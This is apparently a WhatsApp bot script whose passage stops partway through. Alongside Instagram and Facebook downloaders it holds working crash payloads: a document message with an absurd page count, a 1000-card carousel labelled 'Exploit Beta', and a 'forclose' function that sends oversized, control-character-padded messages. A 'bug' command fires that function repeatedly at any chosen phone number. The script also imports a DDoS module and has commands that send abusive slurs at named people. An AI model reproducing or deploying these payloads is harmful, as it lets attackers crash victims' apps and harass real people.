


//base by © sevenz/Yuri
//developer famofc










require("./config")
const {
generateMessageIDV2, 
generateMessageID, 
WA_DEFAULT_EPHEMERAL, 
getAggregateVotesInPollMessage,
generateWAMessageFromContent,
proto, 
generateWAMessageContent,
 generateWAMessage, 
prepareWAMessageMedia,
downloadContentFromMessage, 
areJidsSameUser,
 getContentType, 
useMultiFileAuthState,
 makeWASocket, 
fetchLatestBaileysVersion,
makeCacheableSignalKeyStore,
 makeWaSocket } = require("@adiwajshing/baileys")
const fs = require('fs')
const util = require('util')
const axios = require('axios')
const { exec } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone');
const yts = require ('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity')
const pino = require('pino')
const logger = pino({ level: 'debug' });
const JSConfuser = require("js-confuser");
const crypto = require('crypto');
const path = require('path')
let aiMode = false; // Default: AI Mode is OFF




module.exports = async (conn, m) => {
try {
const from = m.key.remoteJid
const info = m.message

var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id:(m.mtype === 'conversation') ? m.message.conversation :(m.mtype === 'deviceSentMessage') ? m.message.extendedTextMessage.text :(m.mtype == 'imageMessage') ? m.message.imageMessage.caption :(m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, getPing, tanggal, getRandom } = require('./lib/myfunc')
var budy = (typeof m.text == 'string' ? m.text: '')
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix

const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = args.join(" ")
const q = args.join(" ")
const sender = m.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await conn.decodeJid(conn.user.id)

const senderNumber = sender.split('@')[0]

const pushname = m.pushName || `${senderNumber}`
const premium = JSON.parse(fs.readFileSync('./database/premium.json'))
const isPremium = [botNumber, ...premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
let list = []
for (let i of kon) {
list.push({
displayName: await AryaRyuigichi.getName(i),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await deltaJomok.getName(i + '@s.whatsapp.net')}\n
FN:${await deltaJomok.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:famofcyt@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://github.com/faheemxyz\n
item3.X-ABLabel:GitHub\n
item4.ADR:;;Gabon;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}
conn.sendMessage(jid, { contacts: { displayName: `${list.length} Contact`, contacts: list }, ...opts }, { quoted })
}

const isBot = m.key.fromMe ? true : false
const os = require('os')
const time = hora = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
const data = date = dataa = moment.tz('America/Sao_Paulo').format('DD/MM/YY')
const isGroup = m.chat.endsWith("@g.us")
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
		const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
		const mentionByReply = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || "" : ""
		const Inputo = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const groupMetadata = m.isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const PrecisaSerMembro = m.isGroup ? await participants.filter(v => v.admin === null).map(v => v.id) : [];
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false

const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')
const pickRandom = (arr) => {return arr[Math.floor(Math.random() * arr.length)]}
const famofc = fs.readFileSync('./famofc_v10/famofc.jpg')

const { startDDoS } = require('./famofc_v10/DDoS'); // DDoS Attack Script کو امپورٹ کریں
const { teksbug2 } = require("./famofc_v10/delay.js")


if (aiMode && text) { 
    await getAIResponse(text, m);
}

if (m.message) {
console.log(`
╭─────────────────────────────────
│〔 OF 〕: ${sender}
│
│〔 MESSAGE 〕: ${body}
│
│〔 NAME 〕: ${pushname} 
│
│〔 TYPE 〕: ${m.mtype}
│
╰─────────────────────────────────`) 
}


const numeroFormatado = q.replace(/[^\d]/g, '');
const numi = numeroFormatado + '@s.whatsapp.net'

const enviar = (texto) => {
    conn.sendMessage(from, { text: texto }, { quoted: m });
};
const reply = (texto) => {
    conn.sendMessage(from, { text: texto }, { quoted: m });
};

const crashdoc = {key: {fromMe: false,participant: "0@s.whatsapp.net",remoteJid: "0@s.whatsapp.net",},message: {documentMessage: {url: "https://mmg.whatsapp.net/v/t62.7119-24/29212508_374854352198737_2889841909752059083_n.enc?ccb=11-4&oh=01_Q5AaIDB7jPhV8J-vkbbaYZYQtTzgrLTBx4DgorbqAFcdDoPl&oe=665973D2&_nc_sid=5e03e0&mms3=true",mimetype: "text/plain",fileSha256: "VigI621vLq45R4KIODq41owOti/0ZXSK+aLEZOl79H8=",fileLength: "2143",pageCount: 999999999999999,mediaKey: "qStyFpDZOsxVCbR6oWfjM1AP6OKPloEYtoDVHeAEdxI=",fileName: "types.travadoc",fileEncSha256: "DOWZGa+9qihKxH1ZG0Fi0YhhSb1eZrFNM961Jlbzxdg=",directPath: "/v/t62.7119-24/29212508_374854352198737_2889841909752059083_n.enc?ccb=11-4&oh=01_Q5AaIDB7jPhV8J-vkbbaYZYQtTzgrLTBx4DgorbqAFcdDoPl&oe=665973D2&_nc_sid=5e03e0",mediaKeyTimestamp: "1714550098",contactVcard: true,}},}

//crash
let push = [];
let buttt = [];
for (let i = 0; i < 1000; i++) {push.push({body: proto.Message.InteractiveMessage.Body.fromObject({text: "ㅤ"}),footer: proto.Message.InteractiveMessage.Footer.fromObject({text: "ㅤㅤ"}),header: proto.Message.InteractiveMessage.Header.fromObject({title: '\n', hasMediaAttachment: true,"imageMessage": {"url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true","mimetype": "image/jpeg","fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=","fileLength": "10840","height": 10,"width": 10,"mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=","fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=","directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0","mediaKeyTimestamp": "1721344123","jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECECFBMTJRUv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",}}),nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({"buttons": [] })});}
const carousel = generateWAMessageFromContent(from, {viewOnceMessage: {message: {messageContextInfo: {deviceListMetadata: {},deviceListMetadataVersion: 2},interactiveMessage: proto.Message.InteractiveMessage.fromObject({body: proto.Message.InteractiveMessage.Body.create({text: "Exploit Beta™ Seven ;;"}),footer: proto.Message.InteractiveMessage.Footer.create({text: global.namabot}),header: proto.Message.InteractiveMessage.Header.create({hasMediaAttachment: false}),carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({cards: [...push]})})}}}, {});

async function sendFakeMessage(jides,definirText) {await conn.relayMessage(jides, {extendedTextMessage: {text: definirText},"deviceSentMessage": {"phash": ""}}, {});}

async function forclose(target, conn) {
    console.log(`[LOG] Sending forclose to ${target}`);

    let venomModsData = JSON.stringify({
        status: true,
        criador: "VenomMods",
        resultado: {
            type: "md",
            ws: {
                _events: { "CB:ib,,dirty": ["Array"] },
                _eventsCount: 800000,
                _maxListeners: 0,
                url: "wss://web.whatsapp.com/ws/chat",
                config: {
                    version: ["Array"],
                    browser: ["Array"],
                    waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                    depayyCectTimeoutMs: 20000,
                    keepAliveIntervalMs: 30000,
                    logger: {},
                    printQRInTerminal: false,
                    emitOwnEvents: true,
                    defaultQueryTimeoutMs: 60000,
                    customUploadHosts: [],
                    retryRequestDelayMs: 250,
                    maxMsgRetryCount: 5,
                    fireInitQueries: true,
                    auth: { Object: "authData" },
                    markOnlineOndepayyCect: true,
                    syncFullHistory: true,
                    linkPreviewImageThumbnailWidth: 192,
                    transactionOpts: { Object: "transactionOptsData" },
                    generateHighQualityLinkPreview: false,
                    options: {},
                    appStateMacVerification: { Object: "appStateMacData" },
                    mobile: true
                }
            }
        }
    });

    let stanza = [
        { attrs: { biz_bot: "1" }, tag: "bot" },
        { attrs: {}, tag: "biz" }
    ];

    let message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 3.2,
                    isStatusBroadcast: true,
                    statusBroadcastJid: "status@broadcast",
                    badgeChat: { unreadCount: 9999 }
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "proto@newsletter",
                    serverMessageId: 1,
                    newsletterName: `𖣂🩸𝐈𝐬𝖆𝖌𝖎 𝐊𝖎𝖑 𝐘𝖔𝖚🩸𖣂${"ꥈ  ꥈ".repeat(10)}`,
                    contentType: 3,
                    accessibilityText: `𖣂🩸𝐈𝐬𝖆𝖌𝖎 𝐊𝖎𝖑 𝐘𝖔𝖚🩸𖣂${"﹏".repeat(102002)}`,
                },
                interactiveMessage: {
                    contextInfo: {
                        businessMessageForwardInfo: { businessOwnerJid: target },
                        dataSharingContext: { showMmDisclosure: true },
                        participant: "0@s.whatsapp.net",
                        mentionedJid: ["13135550002@s.whatsapp.net"],
                    },
                    body: {
                        text: "\u0003" + "ꦽ".repeat(102002) + "\u0003".repeat(102002)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "single_select", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_method", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "call_permission_request", buttonParamsJson: venomModsData + "\u0003".repeat(9999), voice_call: "call_galaxy" },
                            { name: "form_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_learn_more", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_transaction_details", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_fbpin_reset", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "catalog_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_info", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "review_order", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "send_location", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payments_care_csat", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "view_product", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_settings", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "address_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "automated_greeting_message_view_catalog", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "open_webview", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "message_with_link_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "galaxy_costum", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "extensions_message_v2", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "landline_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "mpm", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_copy", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_url", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "review_and_pay", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "galaxy_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) }
                        ]
                    }
                }
            }
        },
        additionalNodes: stanza,
        stanzaId: `stanza_${Date.now()}`
    };

    await conn.relayMessage(target, message, { participant: { jid: target } });
    console.log(`[SUCCESS] Sent forclose UI to ${target}`);
}
const qloc = {
    "key": {
        "participant": '0@s.whatsapp.net',
        "remoteJid": "status@broadcast",
        "fromMe": false,
        "id": "Halo"
    },
    "message": {
        "locationMessage": {
            "name": 'Developer famofc',
            "jpegThumbnail": null // Set a Base64 image if needed
        }
    }
};

const imagePath = './famofc_v10/famofc.jpg';  
const audioPath = './famofc_v10/Famzysound.mp3';  
const malik = './famofc_v10/Malik.mp3';
// Preload image and audio buffers to avoid redundant disk reads
const maliksong = fs.readFileSync(malik);
const imageBuffer = fs.readFileSync(imagePath);
const audioBuffer = fs.readFileSync(audioPath);

const enviar2 = (teks) => {
conn.sendMessage(from, { text : teks }, { quoted : m })
}

const famreply2 = async (texto) => {
    await conn.sendMessage(m.chat, {
        text: texto,
        contextInfo: {
            mentionedJid: [m.sender],
            forwardedNewsletterMessageInfo: {
                newsletterName: "fam vip bot",
                newsletterJid: "120363390114292114@newsletter"
            },
            isForwarded: true,
            externalAdReply: {
                title: "fam vip bot v10",
                thumbnailUrl: 'https://i.ibb.co/P2Gg1Wd/fam-ofc.jpg',
                sourceUrl: "https://whatsapp.com/channel/0029Vb2pMIt1NCrUCy9Q0f3C"
            }
        }
    }, { quoted: m });
};

const famreply = async (texto) => {
    const imageBuffer = fs.readFileSync('./famofc_v10/famofc.jpg');
    await conn.sendMessage(m.chat, {
        image: imageBuffer,
        caption: texto,
        contextInfo: {
            mentionedJid: [m.sender],
            forwardedNewsletterMessageInfo: {
                newsletterName: "fam vip bot",
                newsletterJid: "120363390114292114@newsletter"
            },
            isForwarded: true,
            externalAdReply: {
                title: "fam vip bot v10",
                thumbnailUrl: 'https://i.ibb.co/P2Gg1Wd/fam-ofc.jpg',
                sourceUrl: "https://whatsapp.com/channel/0029Vb2pMIt1NCrUCy9Q0f3C"
            }
        }
    }, { quoted: m });
};
const ownerFile = "./database/owner.json";

// 📂 Read & Write Owner Data
const getOwners = () => {
    if (!fs.existsSync(ownerFile)) return [];
    return JSON.parse(fs.readFileSync(ownerFile));
};
const saveOwners = (owners) => {
    fs.writeFileSync(ownerFile, JSON.stringify(owners, null, 2));
};

// 🔥 Check if User is Owner
const isCreator = (sender) => {
    const owners = getOwners();
    return owners.includes(sender);
};






async function loadingx() {
    const loadingz = [
        "> *🕘 L O*",
        "> *🕣 L O A*",
        "> *🕠 L O A D*",
        "> *🕔 L O A D I*",
        "> *🕟 L O A D I N*",
        "> *🕔 L O A D I N G*",
        "> *🕔 L O A D I N G*",
        "> *🕐 L O A D I N G*",
        "> *🕧 L O A D I N G*",
      
    ];

    // Send initial message and get key for editing
    let { key } = await conn.sendMessage(m.chat, {
        text: "*✅*"
    }, { quoted: m });

    // Loop through loading stages and edit message
    for (let i = 0; i < loadingz.length; i++) {
        await sleep(400); // 400ms delay between updates
        await conn.sendMessage(m.chat, { 
            text: loadingz[i], 
            edit: key 
        }, { quoted: m });
    }
}




switch(command) {
case "malik": {
    try {

        // آڈیو MP3 بھیجیں
        await conn.sendMessage(m.chat, {
            audio: maliksong,
            mimetype: "audio/mpeg",
            ptt: false,
            caption: `🎵 *مالک - گانا MP3*\n\n🔥 *پاورڈ بائی FAM OFC*`,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "fam vip bot",
                    newsletterJid: "120363390114292114@newsletter"
                },
                isForwarded: true,
                externalAdReply: {
                    title: "fam vip bot v10",
                    thumbnailUrl: "https://i.ibb.co/P2Gg1Wd/fam-ofc.jpg",
                    sourceUrl: "https://whatsapp.com/channel/0029Vb2pMIt1NCrUCy9Q0f3C"
                }
            }
        }, { quoted: m });

        console.log(`[SUCCESS] Malik.mp3 sent to ${m.sender}`);
    } catch (error) {
        console.error("Malik Song Error:", error);
        await conn.sendMessage(m.chat, { text: `❌ *خطا:* ${error.message || "گانا بھیجنے میں ناکامی۔ براہ کرم دوبارہ کوشش کریں۔"}\n\n🔥 *پاورڈ بائی FAM OFC*` }, { quoted: m });
    }
}
break;

case "bug": {
    if (!isCreator(sender)) return enviar("❌ Only the Owner can use this command!");

    // Check if input is provided and in correct format
    if (!text || !text.includes("|")) {
        return enviar(`📌 *Usage:* ${prefix + command} <number>|<amount>\nExample: ${prefix + command} 923350963366|10\n\n🚀 Powered by FAM OFC`);
    }

    // Split input into number and amount
    let [phoneNumber, amount] = text.split("|");
    phoneNumber = phoneNumber.replace(/[^0-9]/g, ""); // Clean number
    amount = parseInt(amount);

    // Validate phone number and amount
    if (!phoneNumber || phoneNumber.length < 10) {
        return enviar("❌ *Invalid phone number!* Please provide a valid number (e.g., 923350963366).\n\n🚀 Powered by FAM OFC");
    }
    if (isNaN(amount) || amount < 1 || amount > 50) { // Limit amount to prevent abuse
        return enviar("❌ *Invalid amount!* Please specify a number between 1 and 50.\n\n🚀 Powered by FAM OFC");
    }

    // Format target JID
    const target = `${phoneNumber}@s.whatsapp.net`;

    // Verify if number is registered on WhatsApp
    let ceknya = await conn.onWhatsApp(target);
    if (ceknya.length == 0) {
        return enviar(`❌ *Number not registered on WhatsApp!* Please use a valid WhatsApp number.\n\n🚀 Powered by FAM OFC`);
    }

    try {
        // Send loading animation
        await loadingx();

        // Send forclose message the specified number of times
        for (let i = 0; i < amount; i++) {
            await forclose(target, conn);
            await sleep(1000); // 1-second delay between messages to avoid rate-limiting
        }

        // Send success message with branding
        await famreply(`✅ *Bug Sent Successfully!*\n\n📱 *Target:* ${phoneNumber}\n🔢 *Amount:* ${amount}\n\n🔥 *Powered by FAM OFC*`);
    } catch (error) {
        console.error("Bug Command Error:", error);
        await enviar(`❌ *Error:* ${error.message || "Failed to send bug. Try again later."}\n\n🚀 Powered by FAM OFC`);
    }
}
break;

case "igdl":
case "ig": {
    // Check if Instagram URL is provided
    if (!text) {
        return enviar(`📌 *Usage:* ${prefix + command} <instagram_url>\nExample: ${prefix + command} https://www.instagram.com/reel/DIotG-1Nfm5/\n\n🔥 *Powered by FAM OFC*`);
    }

    // Validate URL
    const url = text.trim();
    if (!isUrl(url) || !url.includes("instagram.com")) {
        return enviar("❌ *Invalid URL!* Please provide a valid Instagram post or reel URL (e.g., https://www.instagram.com/reel/DIotG-1Nfm5/).");
    }

    try {
        // Send loading animation
        await loadingx();

        // Fetch video from API
        const apiUrl = `https://rest-lily.vercel.app/api/downloader/igdl?url=${encodeURIComponent(url)}`;
        const response = await axios.get(apiUrl, {
            headers: { Accept: "*/*" }
        });
        const data = response.data;

        if (data.status === true && data.data && data.data.length > 0 && data.data[0].url) {
            const videoUrl = data.data[0].url;
            const thumbnailUrl = data.data[0].thumbnail || "https://i.ibb.co/P2Gg1Wd/fam-ofc.jpg"; // Fallback thumbnail
            const creator = data.creator || "Unknown";

            // Prepare caption
            const caption = `🎥 *Instagram Downloader*\n\n\n\n\n🔥 *Powered by FAM OFC*`;

            // Send video message
            await conn.sendMessage(m.chat, {
                video: { url: videoUrl },
                caption: caption,
                thumbnailUrl: thumbnailUrl,
                contextInfo: {
                    mentionedJid: [m.sender],
                    forwardedNewsletterMessageInfo: {
                        newsletterName: "fam vip bot",
                        newsletterJid: "120363390114292114@newsletter"
                    },
                    isForwarded: true,
                    externalAdReply: {
                        title: "fam vip bot v10",
                        thumbnailUrl: "https://i.ibb.co/P2Gg1Wd/fam-ofc.jpg",
                        sourceUrl: "https://whatsapp.com/channel/0029Vb2pMIt1NCrUCy9Q0f3C"
                    }
                }
            }, { quoted: m });
        } else {
            await enviar(`❌ *Failed to download video:* ${data.message || "No video found in the provided URL."}\nPlease check the URL and ensure the post/reel is public.`);
        }
    } catch (error) {
        console.error("Instagram Downloader Error:", error);
        await conn.sendMessage(m.chat, { text: `❌ *Error:* ${error.message || "Unable to download Instagram video. Try again later."}` }, { quoted: m });
    }
}
break;


case "webcopy": {
    // Check if URL is provided
    if (!text) {
        return enviar(`📌 *Usage:* ${prefix + command} <url>\nExample: ${prefix + command} https://example.com\nURL must include http:// or https://`);
    }

    // Validate URL
    const url = text.trim();
    if (!isUrl(url)) {
        return enviar("❌ *Invalid URL!* Please provide a valid website link (e.g., https://example.com)");
    }

    try {
        // Send loading message
        await loadingx();

        // Fetch source code from API
        const apiUrl = `https://fam-official.serv00.net/sim/source.php?url=${encodeURIComponent(url)}`;
        const response = await axios.get(apiUrl);
        const data = response.data;

        if (data.status === "success" && data.sourceCode) {
            // Prepare vCard-style interactive message with copy button
            const sourceCode = data.sourceCode;
            const formattedMessage = `🎩 *FAM OFC Web Source Fetcher*\n\n🌐 *URL:* ${url}\n📄 *Source Code Length:* ${data.contentLength} characters\n📅 *Fetched At:* ${data.timestamp}\n\n🔥 *Powered by FAM OFC*`;

            const msg = generateWAMessageFromContent(
                m.chat,
                {
                    viewOnceMessage: {
                        message: {
                            interactiveMessage: {
                                header: {
                                    title: "🌐 Web Source Code",
                                    hasMediaAttachment: false
                                },
                                body: {
                                    text: formattedMessage
                                },
                                footer: {
                                    text: global.namaBot
                                },
                                nativeFlowMessage: {
                                    buttons: [
                                        {
                                            name: "cta_copy",
                                            buttonParamsJson: JSON.stringify({
                                                display_text: "📋 Copy Source Code",
                                                copy_code: sourceCode
                                            })
                                        }
                                    ]
                                }
                            }
                        }
                    }
                },
                {}
            );

            await conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
        } else {
            await enviar(`❌ *Failed to fetch source code:* ${data.message || 'Unknown error.'}`);
        }
    } catch (error) {
        console.error("Webcopy Command Error:", error);
        await enviar(`❌ *Error:* ${error.message || "Unable to fetch source code. Try again later."}`);
    }
}
break;





case "fb": {
    let url = text.trim();
    let mentionedJid = null;

    // Check if it's a reply in a group
    if (m.message?.extendedTextMessage?.contextInfo?.quotedMessage && m.key.remoteJid.endsWith('@g.us')) {
        mentionedJid = m.message.extendedTextMessage.contextInfo.participant;
        if (!url && m.message.extendedTextMessage.contextInfo.quotedMessage.conversation) {
            url = m.message.extendedTextMessage.contextInfo.quotedMessage.conversation.trim();
        }
    }

    // Validate URL
    if (!url) {
        return enviar(`📌 *Usage:* ${prefix + command} <Facebook URL>\nExample: ${prefix + command} https://fb.watch/xyz\nOr reply to a message containing a Facebook URL with .fb`);
    }

    if (!url.includes('facebook.com') && !url.includes('fb.watch')) {
        return enviar('❌ Invalid URL - Must be from Facebook (facebook.com or fb.watch)');
    }

    try {
        // Notify user that processing has started
        await enviar('⏳ Processing your Facebook video...');

        // Fetch video links from API
        const apiURL = `https://tcs-demonic2.vercel.app/api/fbdownloader?url=${encodeURIComponent(url)}`;
        const response = await fetch(apiURL);
        const data = await response.json();

        if (!data.success || !data.data.success) {
            throw new Error(data.message || "Failed to fetch video links.");
        }

        const { hdlink, sdlink } = data.data;

        // Try to download and send video (prefer HD)
        let videoUrl = hdlink || sdlink;
        if (videoUrl) {
            // Fetch video as buffer
            const videoResponse = await fetch(videoUrl);
            const videoBuffer = Buffer.from(await videoResponse.arrayBuffer());

            // Check file size (WhatsApp limit ~100MB)
            const fileSizeMB = videoBuffer.length / (1024 * 1024);
            if (fileSizeMB <= 100) {
                await conn.sendMessage(m.chat, {
                    video: videoBuffer,
                    caption: `🎥 *Facebook Video Downloaded!*\nQuality: ${hdlink ? 'HD' : 'SD'}\nURL: ${url}`,
                    contextInfo: {
                        mentionedJid: mentionedJid ? [mentionedJid, m.sender] : [m.sender],
                        forwardedNewsletterMessageInfo: {
                            newsletterName: "fam vip bot",
                            newsletterJid: "120363390114292114@newsletter"
                        },
                        isForwarded: true,
                        externalAdReply: {
                            title: "fam vip bot v10",
                            thumbnailUrl: 'https://i.ibb.co/P2Gg1Wd/fam-ofc.jpg',
                            sourceUrl: "https://whatsapp.com/channel/0029Vb2pMIt1NCrUCy9Q0f3C"
                        }
                    }
                }, { quoted: m });
            } else {
                // Send links if video is too large
                let message = `⚠ Video too large to send (${fileSizeMB.toFixed(2)} MB)!\n\n🎥 *Facebook Video Links:*\n`;
                if (hdlink) message += `📽 *HD*: ${hdlink}\n`;
                if (sdlink) message += `📽 *SD*: ${sdlink}\n`;
                message += `\nURL: ${url}`;
                await enviar(message);
            }
        } else {
            throw new Error("No video links available.");
        }

        // Success notification
        await enviar('✅ Video processed successfully!');
    } catch (error) {
        console.error("FB Downloader Error:", error);
        await enviar(`❌ *Error:* ${error.message || "Failed to download video. Please try again."}`);
    }}
    break;

case "gli": {
    // Define galiyan array
    const galiyan = [
        '*rishi* Bkl mkc gando lory 6ky ✒️chod',
        '*rishi* Gndu Bkl Dala Bc Mc Mkc Bhawa Lusi Kaner L8a',
        '*rishi* Bc mc gandu king 6ky ✒️',
        '*rishi* Ullu ka pattha 360 🦉'
    ];

    try {
        // Select a random gali
        const randomGali = galiyan[Math.floor(Math.random() * galiyan.length)];
        
        // Send the gali using enviar
        await famreply2(randomGali);
    } catch (error) {
        console.error("Gali Command Error:", error);
        await enviar(`⚠ *Error:* ${error.message}`);
    }}
    break;


case "gali": {
    if (!isCreator(sender)) return enviar("❌ abu ko gali 😂");
    // Define prime users (update this list with actual prime user JIDs)
    const primeUsers = [
        "923001234567@s.whatsapp.net",
        "923451234567@s.whatsapp.net"
    ];

    // Define restricted names
    const restrictedNames = ['fam', 'famofc', 'faheem', 'glis'];

    // Define galiyan array
    const galiyan = [
        'Bkl mkc gando lory 6ky ✒️chod',
        'Gndu Bkl Dala Bc Mc Mkc Bhawa Lusi Kaner L8a',
        'Bc mc gandu king 6ky ✒️',
        'Ullu ka pattha 360 🦉'
    ];

    let targetName = text.trim();
    let mentionedJid = null;

    // Check if it's a reply in a group
    if (m.message?.extendedTextMessage?.contextInfo?.quotedMessage && m.key.remoteJid.endsWith('@g.us')) {
        mentionedJid = m.message.extendedTextMessage.contextInfo.participant;
        if (!targetName) {
            // If no name provided, use the replied user's name or number
            targetName = await conn.getName(mentionedJid) || mentionedJid.split('@')[0];
        }
    } else if (!targetName) {
        // No reply and no name provided
        return enviar(`📌 *Usage:* ${prefix + command} <name>\nExample: ${prefix + command} rishi\nOr reply to a message in a group with .gali`);
    }

    // Normalize and clean targetName
    const normalizeUnicode = (str) => {
        const unicodeMap = {
            '𝗔': 'A', '𝗕': 'B', '𝗖': 'C', '𝗗': 'D', '𝗘': 'E', '𝗙': 'F', '𝗚': 'G', '𝗛': 'H', '𝗜': 'I', '𝗝': 'J',
            '𝗞': 'K', '𝗟': 'L', '𝗠': 'M', '𝗡': 'N', '𝗢': 'O', '𝗣': 'P', '𝗤': 'Q', '𝗥': 'R', '𝗦': 'S', '𝗧': 'T',
            '𝗨': 'U', '𝗩': 'V', '𝗪': 'W', '𝗫': 'X', '𝗬': 'Y', '𝗭': 'Z',
